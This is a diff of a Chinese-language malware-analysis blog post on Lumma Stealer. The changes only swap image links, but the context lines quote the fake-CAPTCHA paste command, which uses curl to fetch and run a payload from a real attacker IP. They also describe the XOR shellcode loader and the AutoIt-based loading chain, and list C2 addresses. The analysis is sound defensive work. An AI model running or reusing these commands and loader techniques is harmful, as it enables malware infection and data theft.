@@ -41,7 +41,7 @@ Lumma Stealer（又名 LummaC2）是目前市场上最活跃的恶意软件即�
   2. 按下 `Ctrl + V`（粘贴）。
   3. 按下 `Enter`（执行）。
 
-  ![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252788.jpg)
+  ![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221705206.jpeg)
 
 
 ### 2. 载荷：剪贴板中的恶意代码
@@ -54,7 +54,7 @@ cmd.exe /c start /min cmd /k "curl -s [http://85.209.129.105:2020/19](http://85.
 
 这段代码直接调用 `curl` 从远程服务器拉取第二阶段的 Payload 并在内存中执行，完全绕过了浏览器的文件下载扫描。
 
-![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252789.jpg)
+![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221709166.jpeg)
 
 ### 3. 执行链分析
 
@@ -64,7 +64,7 @@ cmd.exe /c start /min cmd /k "curl -s [http://85.209.129.105:2020/19](http://85.
 - **加载器 (`test.py` / `test.pyw`)**：负责解密和加载 Shellcode。
 - **加密载荷 (`data.bin`)**：真正的 Lumma Shellcode。
 
-![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252790.jpg)
+![img](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221711789.jpeg)
 
 **代码逻辑分析 (`test.pyw`)：** 加载器使用 Python 的 `ctypes` 库直接调用 Windows API。
 
@@ -72,19 +72,19 @@ cmd.exe /c start /min cmd /k "curl -s [http://85.209.129.105:2020/19](http://85.
 2. **解密**：使用简单的 XOR 算法（如 `key = 0x3B`）在内存中还原 Shellcode。
 3. **注入**：调用 `kernel32.VirtualAlloc` 申请可执行内存（`0x40` PAGE_EXECUTE_READWRITE），使用 `RtlMoveMemory` (ctypes.memmove) 写入 Shellcode，最后通过 `ctypes.CFUNCTYPE` 创建函数指针并执行。
 
-![image-20260124222940132](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252791.png)
+![image-20260124222940132](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221716267.png)
 
 ## 类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析
 
 第二类样本通常伪装成热门游戏或软件的破解补丁（如“PA25...Setup.zip”）。虽然由于样本捕获时 C2 已失活导致无法复现网络交互，但通过分析其遗留的**安装脚本**和**中间文件**，我们可以完整复盘其精妙的“多阶段加载”逻辑。
 
-![Screenshot showing multiple browser tabs open with various download links from websites, including Mega and DepositFiles, illustrating the path for the initial file from online to the victim machine.](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252792.jpeg)
+![Screenshot showing multiple browser tabs open with various download links from websites, including Mega and DepositFiles, illustrating the path for the initial file from online to the victim machine.](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221718170.jpeg)
 
 ### 1. 初始执行：伪装的 Setup.exe
 
 用户运行 `Setup.exe` 后，该程序实际上是一个 Dropper，它会在 `%TEMP%` 目录下释放大量文件名看似随机或具有误导性的文件。
 
-![A screenshot of a computer interface showing the extraction process of a file named "SETUP.zip" into the "Downloads" folder. The folder contents are visible. An information window displays details such as file size and extraction time, and an arrow points to extracted files labeled "INSTALL LUMMA STEALER."](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252793.jpeg)
+![A screenshot of a computer interface showing the extraction process of a file named "SETUP.zip" into the "Downloads" folder. The folder contents are visible. An information window displays details such as file size and extraction time, and an arrow points to extracted files labeled "INSTALL LUMMA STEALER."](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221720657.jpeg)
 
 ### 2. 混淆核心：指鹿为马的文件扩展名
 
@@ -94,7 +94,7 @@ cmd.exe /c start /min cmd /k "curl -s [http://85.209.129.105:2020/19](http://85.
 - **`Dept.pif`**：实际上是合法的 **AutoIt3.exe** 解释器。
 - **`.cda` 文件（如 `Motorcycle.cda`）**：这并非 CD 音轨，而是被分割的二进制数据块或脚本片段。
 
-![image-20260124225640333](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252794.png)
+![image-20260124225640333](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221726008.png)
 
 ### 3. 攻击链复盘（基于残留日志）
 
@@ -146,7 +146,7 @@ Dept.pif N
 - **持久化**：在启动文件夹创建 `NanoCraft.url`，指向 `%LocalAppData%` 下的恶意脚本，实现开机自启。
 - **C2 通信**：尽管 C2 失活，但日志显示它曾试图连接 `5.10.250.239:9000`（SectopRAT 的典型端口）以及多个 `.ru` 结尾的域名（Lumma 的典型 C2）。
 
-![Screenshot of a Wireshark application displaying network traffic data filtered to show interaction from a RAT (Remote Access Trojan) installer, with columns for timestamp, handshake type, host names, and other data, highlighting malicious activities. Text indicates the Lumma Stealer C2 traffic, the request for SECTOP RAT installer and the SECTOP RAT C2 traffic. ](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252796.png)
+![Screenshot of a Wireshark application displaying network traffic data filtered to show interaction from a RAT (Remote Access Trojan) installer, with columns for timestamp, handshake type, host names, and other data, highlighting malicious activities. Text indicates the Lumma Stealer C2 traffic, the request for SECTOP RAT installer and the SECTOP RAT C2 traffic. ](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/blog/20260221221730399.png)
 
 ![Screenshot of a Windows computer screen showing the process of creating a persistent SECTOP RAT on an infected host, with files named AutoIt3.exe being highlighted and details displayed in various open windows.](https://image-hosting-210.oss-cn-beijing.aliyuncs.com/undefined202602162252797.jpeg)
 
